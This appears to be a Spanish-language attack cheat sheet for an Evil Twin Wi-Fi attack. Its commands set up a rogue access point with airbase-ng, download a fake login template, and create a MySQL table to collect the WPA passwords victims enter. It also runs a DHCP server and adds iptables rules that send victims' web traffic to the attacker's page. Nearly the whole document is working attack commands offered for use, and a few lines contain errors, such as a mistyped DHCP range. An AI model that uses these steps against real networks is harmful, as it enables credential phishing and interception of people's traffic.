# Ataques 

Tags: #Attack #EvilTwin #WPA/WPA2 #Airbase 

## Evil Twin Attack 

```bash 
# Crearemos un archivo DHCP para asignar una IP a las victimas

❯ nano /etc/dhcpd.conf                  
	authoritative;
	default-lease-time 600;
	max-lease-time 7200;
	subnet 192.168.69.128 netmask 255.255.255.128 {
		option subnet-mask 255.255.255.128;
		option broadcast-address 192.168.69.255;
		option routers 192.168.69.129;
		option domain-name-servers 8.8.8.8;
		range 192.168.69.130 192.169.69.140;
	}
```

```bash 
# Generamos la plantilla 

❯ cd /var/www/html
❯ wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip   # Descargamos y descomprimimos el contenido en la carpeta de 'html'
❯ service apache2 start && service mysql start                   # Activamos los servicios 
```

```bash 
# Creacion de DB para que los usuarios se puedan conectar 

❯ mysql -uroot                            # Nos conectamos a la DB de nuestro Kali 
	❯ create database rogue_AP;          # Creamos la DB
	❯ show databases; 
	❯ use rogue_AP; 
	❯ create table wpa_keys(password1 varchar(32), password2 varchar(32));
	❯ show tables;
	❯ describe wpa_keys; 
	❯ INSERT INTO wpa_keys (password1, password2) VALUES ('omar', 'omar'); 
	❯ select * from wpa_keys;            # Mirar el contenido ingresado 
	❯ create user fakeap@localhost identified by 'fakeap';     # Creamos el usuario 
	❯ grant all privileges on rogue_AP.* to 'fakeap'@'localhost';
# Ahora si lo que introduzcan en la pagina se guardara en la DB
```

```bash
# Creando un AP de prueba con 'Airbase'

❯ airbase-ng -e <essid> -c 1 -P wlan0mon
	# e = Nombre del AP
	# c = Canal (Debe ser el mismo que el del AP original)
	# P = Responder a todos los 'Probes'
```

```bash 
# Debemos de crear una segunda interfaz llamada 'at0'

❯ ifconfig at0 192.168.69.129 netmask 255.255.255.128 
❯ route add -net 192.168.69.128 netmask 255.255.255.128 gw 192.168.69.129
❯ echo 1 > /proc/sys/net/ipv4/ip_forward                   # Activar el enrutamiento, cuando terminemos la mejor practica es volver a colocar el '0'
```

```bash 
# Crear reglas de acceso a los clientes para decir que el trafico que detecte del puerto 80 de los clientes que se conecten al AP, lo vamos a redirigir a mi IP por el puerto 80

❯ iptables --flush                      # Limpiamos las reglas 
❯ iptables --table nat --flush 
❯ iptables --delete-chain 
❯ iptables --table nat --delete-chain 

❯ iptables -S                           # Mirar que no existe  ninguna regla 
❯ iptables -L

# Haremos que nuestra interfaz de output haga un forwarding a la interfaz 'at0'
❯ iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
❯ iptables --append FORWARD --in-interface at0 -j ACCEPT 
❯ iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80
❯ iptables -t nat -A POSTROUTING -j MASQUERADE 
```

```bash 
# Desplegar el ataque 'EvilTwin'

❯ touch /var/lib/dhcp/dhcpd.leases                    # Creamos el archivo para que no nos marque error 
❯ dhcp -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0 # Indicamos nuestro file dhcp y la ruta donde queremos que almacene nuestro PID
```